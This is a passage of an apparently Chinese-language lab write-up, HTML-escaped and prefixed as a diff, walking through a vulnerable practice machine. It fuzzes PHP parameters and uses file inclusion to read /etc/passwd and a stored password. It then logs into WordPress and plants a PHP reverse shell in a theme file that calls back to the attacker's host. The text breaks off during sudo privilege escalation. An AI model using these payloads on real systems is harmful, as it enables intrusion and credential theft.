+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Looks like you have got some secrets.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Ok I just want to do some help to you. 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Do some more fuzz on every page of php which was finded by you. And if
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;you get any right parameter then follow the below steps. If you still stuck 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Learn from here a basic tool with good usage for OSCP.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;//see the location.txt and you will get your next move//
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这次告诉我们要对php文件模糊测试，并提供了一个github链接给我们&lt;/p&gt;
+&lt;h3 id="访问github链接获取提示"&gt;访问GitHub链接获取提示
+&lt;/h3&gt;&lt;p&gt;下面的命令就是给的模糊测试的教程&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc &lt;span class="m"&gt;404&lt;/span&gt; http://website.com/secret.php?FUZZ&lt;span class="o"&gt;=&lt;/span&gt;something
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;改成我能用的&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc &lt;span class="m"&gt;404&lt;/span&gt; http://10.10.10.100/image.php?FUZZ&lt;span class="o"&gt;=&lt;/span&gt;something
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里参数返回 7 L / 12 W / 136 Ch，这里附上参数讲解&lt;/p&gt;
+&lt;p&gt;L = Lines，响应内容的行数&lt;/p&gt;
+&lt;p&gt;W = Words，响应内容的单词数&lt;/p&gt;
+&lt;p&gt;Ch = Characters，响应内容的字符数&lt;/p&gt;
+&lt;p&gt;没有什么用换index.php看看&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc &lt;span class="m"&gt;404&lt;/span&gt; http://10.10.10.100/index.php?FUZZ&lt;span class="o"&gt;=&lt;/span&gt;something
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;还是相同的返回，不过有个特例&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;000000341: &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="m"&gt;7&lt;/span&gt; L &lt;span class="m"&gt;19&lt;/span&gt; W &lt;span class="m"&gt;206&lt;/span&gt; Ch &lt;span class="s2"&gt;&amp;#34;file&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;说明存在 http://10.10.10.100/index.php?file 先去访问一下&lt;/p&gt;
+&lt;h3 id="访问http101010100indexphpfile"&gt;访问http://10.10.10.100/index.php?file
+&lt;/h3&gt;&lt;p&gt;一眼看过去是还是这个图片，当查看源码或者网页往下滑还发现了提示&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Do something better you are digging wrong file
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;回头看这个//see the location.txt and you will get your next move//&lt;/p&gt;
+&lt;p&gt;在file=加上loaction.txt，访问一下&lt;/p&gt;
+&lt;h3 id="访问http101010100indexphpfilelocationtxt"&gt;访问http://10.10.10.100/index.php?file=location.txt
+&lt;/h3&gt;&lt;p&gt;再次以同样的方式获取提示&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Do something better ok well Now you reah at the exact parameter Now dig some more for next one use &amp;#39;secrettier360&amp;#39; parameter on some other php page for more fun.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;让我换一个php页面然后换指定的参数&lt;/p&gt;
+&lt;h3 id="访问http101010100imagephpsecrettier360"&gt;访问http://10.10.10.100/image.php?secrettier360
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;finaly you got the right parameter
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;告诉我们找到正确的参数&lt;/p&gt;
+&lt;p&gt;整理一下&lt;/p&gt;
+&lt;p&gt;目前我们目录爆破的过程中，跟着作者的提示得到了一个正确的参数&lt;/p&gt;
+&lt;p&gt;secrettier360 只是“参数名正确”，不代表我们已经知道它接收什么值、实现什么功能。它可能是：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;文件名 / 文件路径&lt;/li&gt;
+&lt;li&gt;图片名&lt;/li&gt;
+&lt;li&gt;包含文件的参数&lt;/li&gt;
+&lt;li&gt;命令参数&lt;/li&gt;
+&lt;li&gt;数据库查询条件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="尝试任意读取漏洞"&gt;尝试任意读取漏洞
+&lt;/h3&gt;&lt;p&gt;对 http://10.10.10.100/image.php?secrettier360=/etc/passwd 进行访问&lt;/p&gt;
+&lt;p&gt;回显了内容&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false whoopsie:x:109:117::/nonexistent:/bin/false avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false saned:x:119:127::/var/lib/saned:/bin/false usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false victor:x:1000:1000:victor,,,:/home/victor:/bin/bash mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false saket:x:1001:1001:find password.txt file in my directory:/home/saket: sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;构造 http://10.10.10.100/image.php?secrettier360=../../../../etc/passwd 这个payload也是得到同一的内容，这个payload同时验证了存在路径穿越漏洞&lt;/p&gt;
+&lt;p&gt;区别是&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;第一条直接尝试绝对路径读取 /etc/passwd&lt;/li&gt;
+&lt;li&gt;第二条尝试相对路径穿越读取 /etc/passwd&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;在回显的内容上得到了以下信息&lt;/p&gt;
+&lt;p&gt;看到两个普通用户：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;saket:x:1001:1001:find password.txt file in my directory:/home/saket:
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;其中 saket 的 GECOS 字段明确写着：find password.txt file in my directory。这就是下一步线索&lt;/p&gt;
+&lt;h3 id="为什么要对etcpasswd路径读取"&gt;为什么要对/etc/passwd路径读取
+&lt;/h3&gt;&lt;p&gt;首先我们在启动靶机的时候就知道这个一个Linux靶机&lt;/p&gt;
+&lt;p&gt;然后/etc/passwd 路径所有 Linux 都有，不需要猜路径&lt;/p&gt;
+&lt;p&gt;内容特征明显，一旦读出来就能确认文件读取漏洞，同时也不会破坏靶机&lt;/p&gt;
+&lt;h2 id="文件包含漏洞利用"&gt;文件包含漏洞利用
+&lt;/h2&gt;&lt;p&gt;进一步构造payload http://10.10.10.100/image.php?secrettier360=/home/saket/password.txt&lt;/p&gt;
+&lt;p&gt;读取到了这个账户密码&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;follow_the_ippsec
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="尝试两个已知账户名字分别用同一密码ssh尝试无果"&gt;尝试两个已知账户名字分别用同一密码ssh，尝试无果
+&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ssh victor@10.10.10.100
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;victor@10.10.10.100&lt;span class="s1"&gt;&amp;#39;s password:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;Permission denied, please try again.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;ssh saket@10.10.10.100
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;saket@10.10.10.100&amp;#39;&lt;/span&gt;s password:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Permission denied, please try again.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;实际上这个密码follow_the_ippsec 是 victor 的 WordPress 后台密码&lt;/p&gt;
+&lt;h2 id="来-wordpress-目录尝试寻找和漏洞利用"&gt;来 wordpress 目录，尝试寻找和漏洞利用
+&lt;/h2&gt;&lt;p&gt;nmap漏洞脚本扫描和目录爆破，都证明了这个网站存在 wordpress 这个 cms 内容管理系统&lt;/p&gt;
+&lt;p&gt;可以看到作者就是victor这个名字&lt;/p&gt;
+&lt;h2 id="来到wordpresswp-admin根据获取的账户和密码进行登陆后台尝试"&gt;来到/wordpress/wp-admin/根据获取的账户和密码，进行登陆后台尝试
+&lt;/h2&gt;&lt;p&gt;用 victor:follow_the_ippsec 登录后台&lt;/p&gt;
+&lt;p&gt;登陆成功&lt;/p&gt;
+&lt;h3 id="为什么是这个路径"&gt;为什么是这个路径？
+&lt;/h3&gt;&lt;p&gt;漏洞扫描脚本和第一次目录爆破都获取了这个目录，/wordpress/的下方也有登陆的可交互按钮&lt;/p&gt;
+&lt;h3 id="接下来怎么做"&gt;接下来怎么做？
+&lt;/h3&gt;&lt;p&gt;既然获取到wordpress的管理权限，就要尝试能不能执行一些命令或者程序，例如反弹shell，这边需要通过枚举来寻找入口&lt;/p&gt;
+&lt;p&gt;来到 http://10.10.10.100/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;amp;theme=twentynineteen&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/* Ohh Finaly you got a writable file */
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;根据这个提示和显示找到了可以编写文件的地方&lt;/p&gt;
+&lt;h2 id="写入shell并反弹获取victor权限"&gt;写入shell并反弹获取victor权限
+&lt;/h2&gt;&lt;p&gt;尝试写入内容如下&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt; &lt;span class="nx"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/6666 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;同时在kali上开启监听&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo nc -lvnp &lt;span class="m"&gt;6666&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;接下来访问 /wordpress/wp-content/themes/twentynineteen/secret.php&lt;/p&gt;
+&lt;p&gt;反弹成功&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="为什么是这个路径-1"&gt;为什么是这个路径？
+&lt;/h3&gt;&lt;p&gt;因为 WordPress 主题文件在服务器上的标准路径就是这个，不知道其实源于对 WordPress 的不了解&lt;/p&gt;
+&lt;h2 id="尝试sudo提权并获取user-flag"&gt;尝试sudo提权并获取user flag
+&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;span class="lnt"&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ sudo -l
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;ml/wordpress/wp-content/themes/twentynineteen$ sudo -l 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Matching Defaults entries &lt;span class="k"&gt;for&lt;/span&gt; www-data on ubuntu:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; env_reset, mail_badpass,
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;secure_path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/bin&lt;span class="se"&gt;\:&lt;/span&gt;/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/bin&lt;span class="se"&gt;\:&lt;/span&gt;/snap/bin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;User www-data may run the following commands on ubuntu:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; NOPASSWD: /home/saket/enc
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;关键提权点：www-data 可以以 root 身份、无需密码执行 /home/saket/enc&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
